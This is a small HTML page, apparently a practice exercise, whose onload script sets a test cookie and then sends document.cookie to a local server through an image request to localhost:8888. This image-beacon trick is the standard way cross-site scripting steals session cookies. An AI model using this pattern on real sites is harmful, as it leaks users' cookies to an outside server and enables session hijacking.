<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <script>
        window.onload = function () {
            let ex =new Date()
            document.cookie = 'name=Hello;expires='+ex.toGMTString()
            

            let img = document.createElement('img')
            img.src = `http://localhost:8888/?cookie=${document.cookie}`
            let oBody = document.querySelector('div')
            oBody.append(img)
        }
        
    </script>
</head>
<body>
    <div></div>
</body>
</html>
